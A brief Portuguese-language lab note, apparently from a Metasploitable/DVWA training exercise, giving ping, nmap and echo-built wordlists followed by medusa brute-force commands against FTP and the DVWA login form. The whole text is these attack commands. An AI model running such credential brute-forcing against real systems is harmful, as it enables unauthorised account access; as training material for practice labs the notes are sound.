# Conectando ao FTP

Descobrindo se as máquinas estão conectadas

ping -c 3 ip

Vendo as portas abertas

nmap ip

Criando a lista de username

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Criando a lista de passwords

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

Bruteforce com medusa

medusa -h ip -U users.txt -P pass.txt -M ftp -t 6


# Conectando ao http

Criando a lista de username

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Criando a lista de passwords

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

Bruteforce com medusa

medusa -h ip -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL:'Login failed' -t 6
